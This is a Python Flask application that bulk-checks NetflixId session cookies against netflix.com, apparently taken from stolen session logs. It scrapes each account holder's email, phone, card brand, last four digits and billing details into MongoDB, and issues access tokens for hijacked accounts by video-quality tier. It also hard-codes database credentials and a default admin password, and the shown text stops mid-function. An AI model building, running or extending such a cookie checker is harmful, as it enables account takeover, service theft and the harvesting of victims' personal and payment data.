# app.py - Netflix TV Login System with Advanced Features
# Video Quality Categories: SD, HD720p, HD, UHD
# Run with: pip install flask flask-session requests beautifulsoup4 pymongo dnspython zipfile36

import os
import re
import json
import time
import uuid
import hashlib
import urllib.parse
import requests
import codecs
import secrets
import string
import zipfile
import io
import threading
from datetime import datetime, timedelta
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from flask import Flask, render_template, request, jsonify, session, make_response, abort, render_template_string, redirect, url_for
from flask_session import Session
from werkzeug.middleware.proxy_fix import ProxyFix
from werkzeug.security import generate_password_hash, check_password_hash
from pymongo import MongoClient, ASCENDING, DESCENDING
from pymongo.errors import DuplicateKeyError
import logging
from bson import ObjectId
from functools import wraps

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# -------------------------------------------------------------------
# APP INIT
# -------------------------------------------------------------------

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)

# Configuration
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_FILE_DIR'] = './flask_session'
app.config['PERMANENT_SESSION_LIFETIME'] = 3600
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload
Session(app)

# Ensure session directory exists
os.makedirs('./flask_session', exist_ok=True)

# -------------------------------------------------------------------
# MONGODB CONNECTION
# -------------------------------------------------------------------

MONGO_URI = os.getenv('MONGO_URI', 'mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority')
MONGO_DB = os.getenv('MONGO_DB', 'netflix_tv_login')

try:
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client[MONGO_DB]
    
    # Create collections
    admins_collection = db['admins']
    cookies_collection = db['cookies']
    tokens_collection = db['tokens']
    usage_logs_collection = db['usage_logs']
    settings_collection = db['settings']
    
    # Create indexes
    admins_collection.create_index('username', unique=True)
    cookies_collection.create_index('netflix_id', unique=True, sparse=True)
    cookies_collection.create_index([('video_quality', ASCENDING), ('created_at', DESCENDING)])
    cookies_collection.create_index('last_checked')
    cookies_collection.create_index('is_valid')
    cookies_collection.create_index('is_used')
    
    tokens_collection.create_index('token', unique=True)
    tokens_collection.create_index('created_by')
    tokens_collection.create_index('expires_at')
    tokens_collection.create_index('video_quality')
    tokens_collection.create_index([('expires_at', ASCENDING), ('is_active', ASCENDING)])
    
    usage_logs_collection.create_index('token')
    usage_logs_collection.create_index('cookie_id')
    usage_logs_collection.create_index('used_at')
    usage_logs_collection.create_index([('token', ASCENDING), ('used_at', DESCENDING)])
    
    logger.info("MongoDB connected successfully")
except Exception as e:
    logger.error(f"MongoDB connection error: {e}")
    raise

# -------------------------------------------------------------------
# DEFAULT ADMIN CREATION
# -------------------------------------------------------------------

def create_default_admin():
    """Create default admin if not exists"""
    try:
        if admins_collection.count_documents({}) == 0:
            default_admin = {
                'username': 'admin',
                'password_hash': generate_password_hash('admin123'),
                'created_at': datetime.utcnow(),
                'last_login': None,
                'is_super_admin': True
            }
            admins_collection.insert_one(default_admin)
            logger.info("Default admin created - username: admin, password: admin123")
    except Exception as e:
        logger.error(f"Error creating default admin: {e}")

create_default_admin()

# -------------------------------------------------------------------
# VIDEO QUALITY MAPPING
# -------------------------------------------------------------------

VIDEO_QUALITIES = ['SD', 'HD720p', 'HD', 'UHD']

def normalize_video_quality(video_quality_text):
    """Normalize video quality text to standard categories: SD, HD720p, HD, UHD"""
    if not video_quality_text or video_quality_text == 'Unknown':
        return 'SD'  # Default to SD if unknown
    
    text_lower = video_quality_text.lower()
    
    # Check for UHD/4K
    if 'ultra' in text_lower or '4k' in text_lower or 'uhd' in text_lower:
        return 'UHD'
    # Check for HD (1080p)
    elif 'high' in text_lower or '1080' in text_lower or ('hd' in text_lower and '720' not in text_lower):
        return 'HD'
    # Check for HD720p
    elif 'medium' in text_lower or '720' in text_lower:
        return 'HD720p'
    # Check for SD/Low
    elif 'low' in text_lower or '480' in text_lower or 'sd' in text_lower:
        return 'SD'
    else:
        return 'SD'  # Default to SD

# -------------------------------------------------------------------
# AUTO CLEANUP TASK
# -------------------------------------------------------------------

def auto_cleanup():
    """Automatically clean up invalid cookies and expired tokens"""
    while True:
        try:
            # Delete invalid cookies
            invalid_result = cookies_collection.delete_many({'is_valid': False})
            if invalid_result.deleted_count > 0:
                logger.info(f"Auto cleanup: Deleted {invalid_result.deleted_count} invalid cookies")
            
            # Delete expired tokens
            expired_result = tokens_collection.delete_many({
                'expires_at': {'$lt': datetime.utcnow()}
            })
            if expired_result.deleted_count > 0:
                logger.info(f"Auto cleanup: Deleted {expired_result.deleted_count} expired tokens")
            
            # Deactivate expired tokens that we don't want to delete
            tokens_collection.update_many(
                {'expires_at': {'$lt': datetime.utcnow()}, 'is_active': True},
                {'$set': {'is_active': False}}
            )
            
        except Exception as e:
            logger.error(f"Auto cleanup error: {e}")
        
        # Run every hour
        time.sleep(3600)

# Start auto cleanup thread
cleanup_thread = threading.Thread(target=auto_cleanup, daemon=True)
cleanup_thread.start()

# -------------------------------------------------------------------
# AUTH DECORATOR
# -------------------------------------------------------------------

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_id' not in session:
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# -------------------------------------------------------------------
# NETFLIX HELPER FUNCTIONS
# -------------------------------------------------------------------

def unescape_plan(s):
    """Unescape plan string"""
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def extract_netflix_id_from_line(line):
    """Extract NetflixId from a single line of text"""
    # Try JSON format
    try:
        data = json.loads(line)
        if isinstance(data, dict):
            if data.get("name") == "NetflixId":
                return data.get("value")
            elif "NetflixId" in data:
                return data["NetflixId"]
    except:
        pass
    
    # Try cookie format
    netflix_id_match = re.search(r'NetflixId=([^;,\s\n]+)', line)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    # Try plain text (just the ID)
    if re.match(r'^[a-zA-Z0-9%]+$', line.strip()):
        netflix_id = line.strip()
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_multiple_netflix_ids_from_text(content):
    """Extract multiple NetflixIds from text content (one per line support)"""
    netflix_ids = []
    
    # Split by lines and process each line
    lines = content.split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        # Try to extract from this line
        netflix_id = extract_netflix_id_from_line(line)
        if netflix_id and netflix_id not in netflix_ids:
            netflix_ids.append(netflix_id)
    
    # If no IDs found with line-by-line, try the old method
    if not netflix_ids:
        # Try JSON array format first
        try:
            data = json.loads(content)
            if isinstance(data, list):
                for cookie in data:
                    if cookie.get("name") == "NetflixId":
                        netflix_ids.append(cookie.get("value"))
            elif isinstance(data, dict):
                if "NetflixId" in data:
                    netflix_ids.append(data["NetflixId"])
                elif "cookies" in data:
                    for cookie in data["cookies"]:
                        if cookie.get("name") == "NetflixId":
                            netflix_ids.append(cookie.get("value"))
            if netflix_ids:
                return netflix_ids
        except:
            pass
        
        # Pattern-based extraction
        patterns = [
            r'Cookies\s*=\s*NetflixId=([^\s|]+)',
            r'NetflixId=([^;,\s\n]+)',
            r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s\n]+)',
            r'NetflixId[=:\s]+([^\s;,\n]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                netflix_id = match
                if '%' in netflix_id:
                    try:
                        netflix_id = urllib.parse.unquote(netflix_id)
                    except:
                        pass
                if netflix_id and netflix_id not in netflix_ids:
                    netflix_ids.append(netflix_id)
    
    return netflix_ids

def extract_from_zip(zip_content):
    """Extract Netflix IDs from ZIP file"""
    netflix_ids = []
    
    try:
        with zipfile.ZipFile(io.BytesIO(zip_content)) as zf:
            for filename in zf.namelist():
                if filename.endswith('.txt'):
                    with zf.open(filename) as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        ids = extract_multiple_netflix_ids_from_text(content)
                        netflix_ids.extend(ids)
    except Exception as e:
        logger.error(f"ZIP extraction error: {e}")
    
    return netflix_ids

def extract_profiles_from_manage_profiles(response_text):
    """Extract profile names from ManageProfiles page"""
    profiles = []
    try:
        profiles_match = re.search(r'"profiles"\s*:\s*({[^}]+})', response_text)
        if profiles_match:
            profiles_json_str = profiles_match.group(1)
            
            def unescape_hex(match):
                hex_code = match.group(1)
                try:
                    return chr(int(hex_code, 16))
                except:
                    return match.group(0)
            
            cleaned_json = re.sub(r'\\x([0-9a-fA-F]{2})', unescape_hex, profiles_json_str)
            profiles_data = json.loads(f'{{{cleaned_json}}}')
            
            for profile_id, profile_data in profiles_data.items():
                if isinstance(profile_data, dict):
                    summary = profile_data.get('summary', {})
                    if isinstance(summary, dict):
                        value = summary.get('value', {})
                        if isinstance(value, dict):
                            profile_name = value.get('profileName')
                            if profile_name:
                                profiles.append(profile_name)
    except json.JSONDecodeError:
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
            for profile in profile_matches:
                profile = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), profile)
                profiles.append(profile)
        except:
            pass
    
    # Try BeautifulSoup if regex fails
    if not profiles:
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response_text, 'html.parser')
            profile_elements = soup.find_all('span', class_='profile-name')
            for elem in profile_elements:
                profile = elem.get_text().strip()
                if profile and profile not in profiles:
                    profiles.append(profile)
        except:
            pass
    
    return profiles

def check_cookie_sync(netflix_id):
    """Synchronous cookie check function"""
    session = requests.Session()
    session.cookies.update({'NetflixId': netflix_id})
    url = 'https://www.netflix.com/YourAccount'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'}
    
    try:
        resp = session.get(url, headers=headers, timeout=25)
        txt = resp.text
        
        if '"mode":"login"' in txt:
            return {'ok': False, 'err': 'Invalid cookie', 'netflix_id': netflix_id}
        
        if '"mode":"yourAccount"' not in txt and 'Account & Billing' not in txt:
            return {'ok': False, 'err': 'Not logged in', 'netflix_id': netflix_id}

        def find(pattern):
            m = re.search(pattern, txt)
            return m.group(1) if m else None

        def find_list(pattern):
            return re.findall(pattern, txt)
        
        name = find(r'"userInfo":\{"data":\{"name":"([^"]+)"')
        if name:
            name = name.replace("\\x20", " ")
        else:
            name = "Unknown"
        
        country_code = find(r'"currentCountry":"([^"]+)"') or find(r'"countryCode":"([^"]+)"')
        country = country_code if country_code else "Unknown"
        
        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"')
        if not plan:
            plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if plan:
            plan = plan.replace("\\x20", " ").replace("\\x28", " ").replace("\\x29", " ").replace("\\u0020", " ")
            plan = unescape_plan(plan)
        else:
            plan = "Unknown"

        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
        if plan_price:
            plan_price = unescape_plan(plan_price)
        else:
            plan_price = "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        if member_since:
            member_since = member_since.replace("\\x20", " ")
            member_since = unescape_plan(member_since)
        else:
            member_since = "Unknown"

        next_billing_date = find(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"')
        if next_billing_date:
            next_billing_date = next_billing_date.replace("\\x20", " ")
        else:
            next_billing_date = "Unknown"

        payment_method = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        if not payment_method:
            payment_method = "Unknown"

        card_brand = find_list(r'"paymentOptionLogo":"([^"]+)"')
        if not card_brand:
            card_brand = ["Unknown"]
        
        last4_digits = find_list(r'"GrowthCardPaymentMethod","displayText":"([^"]+)"')
        if not last4_digits:
            last4_digits = ["Unknown"]
        
        phone_match = re.search(r'"growthLocalizablePhoneNumber":\{.*?"phoneNumberDigits":\{.*?"value":"([^"]+)"', txt, re.DOTALL)
        if phone_match:
            phone = phone_match.group(1)
            phone = phone.replace("\\x2B", "+")
        else:
            phone = find(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"')
            if phone:
                phone = phone.replace("\\x2B", "+")
            else:
                phone = "Unknown"

        phone_verified_match = re.search(r'"growthLocalizablePhoneNumber":\{.*?"isVerified":(true|false)', txt, re.DOTALL)
        if phone_verified_match:
            phone_verified = "Yes" if phone_verified_match.group(1) == "true" else "No"
        else:
            phone_verified_match = re.search(r'"growthPhoneNumber":\{"__typename":"GrowthPhoneNumber","isVerified":(true|false)')
            if phone_verified_match:
                phone_verified = "Yes" if phone_verified_match.group(1) == "true" else "No"
            else:
                phone_verified = "Unknown"

        video_quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        if not video_quality:
            video_quality = "Unknown"

        max_streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
        if not max_streams:
            max_streams = "Unknown"

        payment_hold = find(r'"growthHoldMetadata":\{"__typename":"GrowthHoldMetadata","isUserOnHold":(true|false)')
        if payment_hold:
            payment_hold = "Yes" if payment_hold == "true" else "No"
        else:
            payment_hold = "Unknown"

        extra_member = find(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)')
        if extra_member:
            extra_member = "Yes" if extra_member == "true" else "No"
        else:
            extra_member = "Unknown"

        email_verified_match = re.search(r'"growthEmail":\{.*?"isVerified":(true|false)', txt, re.DOTALL)
        if email_verified_match:
            email_verified = "Yes" if email_verified_match.group(1) == "true" else "No"
        else:
            email_verified_match = re.search(r'"emailVerified"\s*:\s*(true|false)', txt)
            if email_verified_match:
                email_verified = "Yes" if email_verified_match.group(1) == "true" else "No"
            else:
                email_verified = "Unknown"
        
        membership_status = find(r'"membershipStatus":"([^"]+)"')
        if not membership_status:
            membership_status = "Unknown"
        
        email_match = re.search(r'"growthEmail":\{.*?"email":\{.*?"value":"([^"]+)"', txt, re.DOTALL)
        if email_match:
            email = email_match.group(1)
            try:
                email = urllib.parse.unquote(email)
            except:
                pass
            email = email.replace('\\x40', '@')
        else:
            email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
            try:
                email = urllib.parse.unquote(email)
            except:
                pass
            email = email.replace('\\x40', '@')
        
        # Get profiles
        profiles = []
        try:
            resp_profiles = session.get("https://www.netflix.com/ManageProfiles", timeout=15)
            profiles = extract_profiles_from_manage_profiles(resp_profiles.text)
        except Exception as e:
            logger.error(f"Error extracting profiles: {e}")
        
        profiles_str = ", ".join(profiles) if profiles else "No profiles"
        connected_profiles_count = len(profiles) if profiles else 0

        # Check if valid
        is_valid = bool(membership_status != "Unknown") or "Account & Billing" in txt
        
        # Normalize video quality
        normalized_quality = normalize_video_quality(video_quality)
        
        # Create account data
        account_data = {
            'netflix_id': netflix_id,
            'is_valid': is_valid,
            'name': name,
            'email': email,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'video_quality_raw': video_quality,
            'video_quality': normalized_quality,
            'max_streams': max_streams,
            'member_since': member_since,
            'next_billing_date': next_billing_date,
            'payment_method': payment_method,
            'card_brand': card_brand[0] if card_brand else "Unknown",
            'last4_digits': last4_digits[0] if last4_digits else "Unknown",
            'phone': phone,
            'phone_verified': phone_verified,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'membership_status': membership_status,
            'connected_profiles': connected_profiles_count,
            'profiles': profiles_str,
            'last_checked': datetime.utcnow(),
            'is_used': False
        }
        
        return {'ok': is_valid, 'data': account_data}
        
    except requests.exceptions.Timeout:
        return {'ok': False, 'err': 'Request timeout', 'netflix_id': netflix_id}
    except requests.exceptions.ConnectionError:
        return {'ok': False, 'err': 'Connection error', 'netflix_id': netflix_id}
    except Exception as e:
        logger.error(f"Error checking cookie: {e}")
        return {'ok': False, 'err': str(e), 'netflix_id': netflix_id}

# -------------------------------------------------------------------
# COOKIE CHECKING WITH CANCELLATION SUPPORT
# -------------------------------------------------------------------

class CookieChecker:
    """Manages cookie checking with cancellation support and real-time progress"""
    
    def __init__(self):
        self.jobs = {}  # job_id -> job_info
        self.cancel_flags = {}  # job_id -> should_cancel
        self.lock = threading.Lock()
    
    def start_job(self, netflix_ids, admin_username):
        """Start a new checking job"""
        job_id = str(uuid.uuid4())
        
        with self.lock:
            self.jobs[job_id] = {
                'id': job_id,
                'total': len(netflix_ids),
                'checked': 0,
                'valid': 0,
                'invalid': 0,
                'quality_counts': {q: 0 for q in VIDEO_QUALITIES},
                'results': [],
                'status': 'running',
                'started_at': datetime.utcnow(),
                'admin': admin_username
            }
            self.cancel_flags[job_id] = False
        
        # Start background thread
        thread = threading.Thread(target=self._process_job, args=(job_id, netflix_ids))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _process_job(self, job_id, netflix_ids):
        """Process job in background"""
        results = []
        
        for i, netflix_id in enumerate(netflix_ids):
            # Check if cancelled
            with self.lock:
                if self.cancel_flags.get(job_id, False):
                    self.jobs[job_id]['status'] = 'cancelled'
                    break
            
            # Check cookie
            result = check_cookie_sync(netflix_id)
            
            with self.lock:
                job = self.jobs[job_id]
                job['checked'] = i + 1
                
                if result.get('ok') and result.get('data'):
                    job['valid'] += 1
                    quality = result['data']['video_quality']
                    if quality in job['quality_counts']:
                        job['quality_counts'][quality] += 1
                else:
                    job['invalid'] += 1
                
                job['results'].append(result)
        
        # Mark as completed if not cancelled
        with self.lock:
            if self.jobs[job_id]['status'] == 'running':
                self.jobs[job_id]['status'] = 'completed'
                self.jobs[job_id]['completed_at'] = datetime.utcnow()
        
        # Auto-delete invalid cookies when job completes
        self._auto_delete_invalid()
    
    def get_progress(self, job_id):
        """Get current job progress"""
        with self.lock:
            job = self.jobs.get(job_id)
            if not job:
                return None
            
            return {
                'job_id': job_id,
                'total': job['total'],
                'checked': job['checked'],
                'valid': job['valid'],
                'invalid': job['invalid'],
                'quality_counts': job['quality_counts'],
                'status': job['status'],
                'percent': int((job['checked'] / job['total']) * 100) if job['total'] > 0 else 0
            }
    
    def cancel_job(self, job_id):
        """Cancel a running job"""
        with self.lock:
            if job_id in self.cancel_flags:
                self.cancel_flags[job_id] = True
                if job_id in self.jobs:
                    self.jobs[job_id]['status'] = 'cancelling'
                return True
        return False
    
    def save_results(self, job_id, admin_username):
        """Save job results to database"""
        with self.lock:
            job = self.jobs.get(job_id)
            if not job or job['status'] != 'completed':
                return None
        
        added = 0
        updated = 0
        
        for result in job['results']:
            if result.get('ok') and result.get('data'):
                account_data = result['data']
                
                existing = cookies_collection.find_one({'netflix_id': account_data['netflix_id']})
                
                if existing:
                    cookies_collection.update_one(
                        {'netflix_id': account_data['netflix_id']},
                        {'$set': {
                            **account_data,
                            'updated_at': datetime.utcnow()
                        }}
                    )
                    updated += 1
                else:
                    account_data['created_at'] = datetime.utcnow()
                    account_data['updated_at'] = datetime.utcnow()
                    account_data['added_by'] = admin_username
                    cookies_collection.insert_one(account_data)
                    added += 1
        
        return {
            'added': added,
            'updated': updated,
            'valid': job['valid'],
            'invalid': job['invalid'],
            'quality_counts': job['quality_counts']
        }
    
    def _auto_delete_invalid(self):
        """Auto delete invalid cookies from database"""
        try:
            result = cookies_collection.delete_many({'is_valid': False})
            if result.deleted_count > 0:
                logger.info(f"Auto-deleted {result.deleted_count} invalid cookies")
        except Exception as e:
            logger.error(f"Auto-delete error: {e}")
    
    def cleanup_old_jobs(self, max_age_hours=1):
        """Clean up old jobs from memory"""
        with self.lock:
            current_time = datetime.utcnow()
            to_delete = []
            
            for job_id, job in self.jobs.items():
                if 'completed_at' in job:
                    age = (current_time - job['completed_at']).total_seconds() / 3600
                    if age > max_age_hours:
                        to_delete.append(job_id)
                elif 'started_at' in job:
                    age = (current_time - job['started_at']).total_seconds() / 3600
                    if age > max_age_hours:
                        to_delete.append(job_id)
            
            for job_id in to_delete:
                del self.jobs[job_id]
                if job_id in self.cancel_flags:
                    del self.cancel_flags[job_id]

# Create global cookie checker instance
cookie_checker = CookieChecker()

# Start cleanup thread for old jobs
def cleanup_old_jobs():
    while True:
        time.sleep(300)  # Every 5 minutes
        cookie_checker.cleanup_old_jobs()

cleanup_thread = threading.Thread(target=cleanup_old_jobs, daemon=True)
cleanup_thread.start()

# -------------------------------------------------------------------
# TOKEN GENERATION WITH QUALITY CHECK
# -------------------------------------------------------------------

def generate_token(video_quality, expiry_days, created_by, notes=""):
    """Generate a unique token for specific video quality with availability check"""
    if video_quality not in VIDEO_QUALITIES:
        video_quality = 'SD'  # Default to SD
    
    # Check if quality has any available accounts
    available_count = cookies_collection.count_documents({
        'is_valid': True,
        'video_quality': video_quality,
        'is_used': {'$ne': True}
    })
    
    if available_count == 0:
        return {'success': False, 'error': f'No {video_quality} accounts available in database'}
    
    token = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    token = '-'.join([token[i:i+4] for i in range(0, 16, 4)])
    
    token_data = {
        'token': token,
        'video_quality': video_quality,
        'created_at': datetime.utcnow(),
        'expires_at': datetime.utcnow() + timedelta(days=expiry_days),
        'created_by': created_by,
        'is_active': True,
        'notes': notes,
        'usage_count': 0,
        'last_used': None,
        'available_accounts': available_count
    }
    
    try:
        tokens_collection.insert_one(token_data)
        return {'success': True, 'token': token, 'available': available_count}
    except DuplicateKeyError:
        return generate_token(video_quality, expiry_days, created_by, notes)

# -------------------------------------------------------------------
# ADMIN ROUTES
# -------------------------------------------------------------------

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        admin = admins_collection.find_one({'username': username})
        
        if admin and check_password_hash(admin['password_hash'], password):
            session['admin_id'] = str(admin['_id'])
            session['admin_username'] = admin['username']
            session['is_super_admin'] = admin.get('is_super_admin', False)
            
            # Update last login
            admins_collection.update_one(
                {'_id': admin['_id']},
                {'$set': {'last_login': datetime.utcnow()}}
            )
            
            return redirect(url_for('admin_dashboard'))
        
        return render_template_string(ADMIN_LOGIN_TEMPLATE, error="Invalid credentials")
    
    return render_template_string(ADMIN_LOGIN_TEMPLATE)

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin')
@admin_required
def admin_dashboard():
    """Admin dashboard"""
    return render_template_string(ADMIN_DASHBOARD_TEMPLATE)

@app.route('/admin/api/stats')
@admin_required
def admin_stats():
    """Get dashboard stats"""
    total_cookies = cookies_collection.count_documents({})
    valid_cookies = cookies_collection.count_documents({'is_valid': True})
    invalid_cookies = cookies_collection.count_documents({'is_valid': False})
    used_cookies = cookies_collection.count_documents({'is_used': True})
    
    # Video quality stats
    quality_stats = {}
    available_quality_stats = {}
    for quality in VIDEO_QUALITIES:
        quality_stats[quality] = cookies_collection.count_documents({
            'is_valid': True,
            'video_quality': quality
        })
        available_quality_stats[quality] = cookies_collection.count_documents({
            'is_valid': True,
            'video_quality': quality,
            'is_used': {'$ne': True}
        })
    
    total_tokens = tokens_collection.count_documents({})
    active_tokens = tokens_collection.count_documents({
        'is_active': True, 
        'expires_at': {'$gt': datetime.utcnow()}
    })
    expired_tokens = tokens_collection.count_documents({'expires_at': {'$lte': datetime.utcnow()}})
    
    total_usage = usage_logs_collection.count_documents({})
    
    # Recent activity
    recent_usage = list(usage_logs_collection.find().sort('used_at', -1).limit(10))
    for log in recent_usage:
        log['_id'] = str(log['_id'])
        if 'used_at' in log:
            log['used_at'] = log['used_at'].isoformat()
    
    return jsonify({
        'total_cookies': total_cookies,
        'valid_cookies': valid_cookies,
        'invalid_cookies': invalid_cookies,
        'used_cookies': used_cookies,
        'quality_stats': quality_stats,
        'available_quality_stats': available_quality_stats,
        'total_tokens': total_tokens,
        'active_tokens': active_tokens,
        'expired_tokens': expired_tokens,
        'total_usage': total_usage,
        'recent_usage': recent_usage
    })

@app.route('/admin/api/cookies/load', methods=['POST'])
@admin_required
def admin_load_cookies():
    """Load and check Netflix cookies with progress"""
    data = request.get_json(silent=True) or {}
    content = data.get('content', '')
    
    if not content:
        return jsonify({'success': False, 'error': 'No content provided'})
    
    # Extract Netflix IDs
    netflix_ids = extract_multiple_netflix_ids_from_text(content)
    
    if not netflix_ids:
        return jsonify({'success': False, 'error': 'No Netflix cookies found'})
    
    # Limit to 500 for performance
    if len(netflix_ids) > 500:
        netflix_ids = netflix_ids[:500]
    
    # Start background job
    job_id = cookie_checker.start_job(netflix_ids, session.get('admin_username', 'admin'))
    
    return jsonify({
        'success': True,
        'job_id': job_id,
        'total': len(netflix_ids)
    })

@app.route('/admin/api/cookies/load-zip', methods=['POST'])
@admin_required
def admin_load_zip():
    """Load cookies from ZIP file"""
    if 'file' not in request.files:
        return jsonify({'success': False, 'error': 'No file uploaded'})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'success': False, 'error': 'No file selected'})
    
    if not file.filename.endswith('.zip'):
        return jsonify({'success': False, 'error': 'File must be ZIP format'})
    
    try:
        zip_content = file.read()
        netflix_ids = extract_from_zip(zip_content)
        
        if not netflix_ids:
            return jsonify({'success': False, 'error': 'No Netflix cookies found in ZIP'})
        

        
        # Start background job
        job_id = cookie_checker.start_job(netflix_ids, session.get('admin_username', 'admin'))
        
        return jsonify({
            'success': True,
            'job_id': job_id,
            'total': len(netflix_ids)
        })
        
    except Exception as e:
        logger.error(f"ZIP processing error: {e}")
        return jsonify({'success': False, 'error': f'Error processing ZIP: {str(e)}'})

@app.route('/admin/api/cookies/progress/<job_id>')
@admin_required
def admin_get_progress(job_id):
    """Get progress for a cookie checking job"""
    progress = cookie_checker.get_progress(job_id)
    if progress:
        return jsonify(progress)
    return jsonify({'error': 'Job not found'}), 404

@app.route('/admin/api/cookies/cancel/<job_id>', methods=['POST'])
@admin_required
def admin_cancel_job(job_id):
    """Cancel a running cookie checking job"""
    if cookie_checker.cancel_job(job_id):
        return jsonify({'success': True, 'message': 'Job cancelled'})
    return jsonify({'success': False, 'error': 'Job not found'})

@app.route('/admin/api/cookies/save/<job_id>', methods=['POST'])
@admin_required
def admin_save_results(job_id):
    """Save job results to database"""
    results = cookie_checker.save_results(job_id, session.get('admin_username', 'admin'))
    
    if results:
        return jsonify({
            'success': True,
            'added': results['added'],
            'updated': results['updated'],
            'valid': results['valid'],
            'invalid': results['invalid'],
            'quality_counts': results['quality_counts'],
            'message': f'✅ Added: {results["added"]} | Updated: {results["updated"]} | Invalid: {results["invalid"]}\n📊 UHD: {results["quality_counts"]["UHD"]} | HD: {results["quality_counts"]["HD"]} | HD720p: {results["quality_counts"]["HD720p"]} | SD: {results["quality_counts"]["SD"]}'
        })
    
    return jsonify({'success': False, 'error': 'Job not found or not completed'})

@app.route('/admin/api/cookies/list')
@admin_required
def admin_list_cookies():
    """List cookies with filters"""
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    quality = request.args.get('quality')
    valid_only = request.args.get('valid_only', 'true') == 'true'
    search = request.args.get('search', '')
    show_used = request.args.get('show_used', 'false') == 'true'
    
    # Build query
    query = {}
    if valid_only:
        query['is_valid'] = True
    if not show_used:
        query['is_used'] = {'$ne': True}
    if quality and quality != 'all':
        query['video_quality'] = quality
    if search:
        query['$or'] = [
            {'netflix_id': {'$regex': search, '$options': 'i'}},
            {'email': {'$regex': search, '$options': 'i'}},
            {'name': {'$regex': search, '$options': 'i'}}
        ]
    
    # Get total count
    total = cookies_collection.count_documents(query)
    
    # Get paginated results
    skip = (page - 1) * per_page
    cookies = list(cookies_collection.find(query, {'_id': 0}).sort('created_at', -1).skip(skip).limit(per_page))
    
    return jsonify({
        'success': True,
        'cookies': cookies,
        'total': total,
        'page': page,
        'per_page': per_page,
        'pages': (total + per_page - 1) // per_page
    })

@app.route('/admin/api/cookies/delete', methods=['POST'])
@admin_required
def admin_delete_cookies():
    """Delete cookies"""
    data = request.get_json(silent=True) or {}
    netflix_ids = data.get('netflix_ids', [])
    delete_all_invalid = data.get('delete_all_invalid', False)
    quality = data.get('quality')
    
    if delete_all_invalid:
        result = cookies_collection.delete_many({'is_valid': False})
        return jsonify({
            'success': True,
            'deleted': result.deleted_count,
            'message': f'🗑️ Deleted {result.deleted_count} invalid cookies'
        })
    
    if quality:
        result = cookies_collection.delete_many({
            'is_valid': True,
            'video_quality': quality
        })
        return jsonify({
            'success': True,
            'deleted': result.deleted_count,
            'message': f'🗑️ Deleted {result.deleted_count} {quality} cookies'
        })
    
    if netflix_ids:
        result = cookies_collection.delete_many({'netflix_id': {'$in': netflix_ids}})
        return jsonify({
            'success': True,
            'deleted': result.deleted_count,
            'message': f'🗑️ Deleted {result.deleted_count} cookies'
        })
    
    return jsonify({'success': False, 'error': 'No cookies specified'})

@app.route('/admin/api/cookies/delete-expired-keys', methods=['POST'])
@admin_required
def admin_delete_expired_keys():
    """Delete all expired tokens"""
    result = tokens_collection.delete_many({
        'expires_at': {'$lt': datetime.utcnow()}
    })
    
    return jsonify({
        'success': True,
        'deleted': result.deleted_count,
        'message': f'🗑️ Deleted {result.deleted_count} expired tokens'
    })

@app.route('/admin/api/cookies/recheck', methods=['POST'])
@admin_required
def admin_recheck_cookies():
    """Recheck cookies for validity"""
    data = request.get_json(silent=True) or {}
    quality = data.get('quality')
    limit = int(data.get('limit', 100))
    
    # Build query
    query = {'is_valid': True}
    if quality and quality != 'all':
        query['video_quality'] = quality
    
    # Get cookies to recheck
    cookies = list(cookies_collection.find(query).limit(limit))
    
    if not cookies:
